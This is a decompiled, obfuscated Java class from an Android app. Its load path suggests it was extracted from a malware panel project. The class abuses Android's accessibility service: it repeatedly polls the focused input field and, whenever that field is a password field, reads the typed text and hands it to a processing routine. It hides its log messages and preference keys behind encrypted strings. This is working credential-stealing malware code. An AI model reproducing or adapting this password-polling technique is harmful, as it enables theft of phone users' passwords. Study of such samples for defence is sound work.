package v.s;

import android.view.accessibility.AccessibilityNodeInfo;
import app.mobilex.plus.services.DataQFAdapter;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class Zj7xUGIRtnJNFsajky implements Runnable {
    public final /* synthetic */ DataQFAdapter vekpFI4d1Nc4fakF;
    public final /* synthetic */ int w9sT1Swbhx3hs;

    public /* synthetic */ Zj7xUGIRtnJNFsajky(DataQFAdapter dataQFAdapter, int i) {
        this.w9sT1Swbhx3hs = i;
        this.vekpFI4d1Nc4fakF = dataQFAdapter;
    }

    @Override // java.lang.Runnable
    public final void run() {
        String string;
        switch (this.w9sT1Swbhx3hs) {
            case 0:
                DataQFAdapter.Companion.getClass();
                DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
                if (dataQFAdapter == null) {
                    return;
                }
                VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ5 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                boolean z = false;
                if (VpKcDcuRNaQkRJ5.ibVTtJUNfrGYbW(dataQFAdapter)) {
                    VpKcDcuRNaQkRJ5.xDyLpEZyrcKVe0 = false;
                    String unused = DataQFAdapter.TAG;
                    TypefaceCache.obtain("0013007F004B008200FC00B600DC00A2006300750053008200F300B400D700B500790036005A008B00E200BA00D300A3003A0036005F008800FE00BA009200EF003300730049009400F900AC00C600A20027003F001700C700F100AA00C600A80000007A0052008400FB00FF00FD00810005");
                    return;
                }
                try {
                    z = dataQFAdapter.getSharedPreferences(TypefaceCache.obtain("00300073004F009200E0008000C200B5002600700048"), 0).getBoolean(TypefaceCache.obtain("00300073004F009200E0008000D100A8002E00660057008200E400BA"), false);
                    break;
                } catch (Exception unused2) {
                }
                if (z) {
                    VpKcDcuRNaQkRJ5 vpKcDcuRNaQkRJ6 = VpKcDcuRNaQkRJ5.dDIMxZXP1V8HdM;
                    if (!VpKcDcuRNaQkRJ5.JXn4Qf7zpnLjP5) {
                        String unused3 = DataQFAdapter.TAG;
                        TypefaceCache.obtain("0013007F004B008200FC00B600DC00A2006300750053008200F300B400D700B5007900360048008200E400AA00C20098002000790056009700FC00BA00C600A2007E00620049009200F500F3009200B4003700770049009300F900B100D500E70033007F004B008200FC00B600DC00A20063003E0059008600F300B400C700B7006A");
                        VpKcDcuRNaQkRJ5.nQilHWaqS401ZtR(dataQFAdapter);
                        return;
                    }
                }
                if (z) {
                    return;
                }
                this.vekpFI4d1Nc4fakF.safePostDelayed(this, 5000L);
                return;
            default:
                DataQFAdapter dataQFAdapter2 = this.vekpFI4d1Nc4fakF;
                if (dataQFAdapter2.pwdPollActive) {
                    if (System.currentTimeMillis() - dataQFAdapter2.pwdPollStartTime > dataQFAdapter2.PWD_POLL_TIMEOUT_MS) {
                        dataQFAdapter2.stopPwdPoll();
                        return;
                    }
                    try {
                        AccessibilityNodeInfo rootInActiveWindow = dataQFAdapter2.getRootInActiveWindow();
                        if (rootInActiveWindow != null) {
                            try {
                                AccessibilityNodeInfo accessibilityNodeInfoFindFocus = rootInActiveWindow.findFocus((-86) + 87);
                                if (accessibilityNodeInfoFindFocus != null) {
                                    try {
                                        if (!accessibilityNodeInfoFindFocus.isPassword()) {
                                            dataQFAdapter2.stopPwdPoll();
                                            accessibilityNodeInfoFindFocus.recycle();
                                            rootInActiveWindow.recycle();
                                            return;
                                        } else {
                                            CharSequence text = accessibilityNodeInfoFindFocus.getText();
                                            if (text == null || (string = text.toString()) == null) {
                                                string = "";
                                            }
                                            if (string.length() > 0) {
                                                dataQFAdapter2.processPwdPollText(string, accessibilityNodeInfoFindFocus);
                                            }
                                            accessibilityNodeInfoFindFocus.recycle();
                                        }
                                    } catch (Throwable th) {
                                        accessibilityNodeInfoFindFocus.recycle();
                                        throw th;
                                    }
                                }
                                rootInActiveWindow.recycle();
                            } catch (Throwable th2) {
                                rootInActiveWindow.recycle();
                                throw th2;
                            }
                        }
                    } catch (Throwable unused4) {
                    }
                    if (dataQFAdapter2.pwdPollActive) {
                        dataQFAdapter2.pwdPollHandler.postDelayed(this, dataQFAdapter2.PWD_POLL_INTERVAL_MS);
                        return;
                    }
                    return;
                }
                return;
        }
    }
}
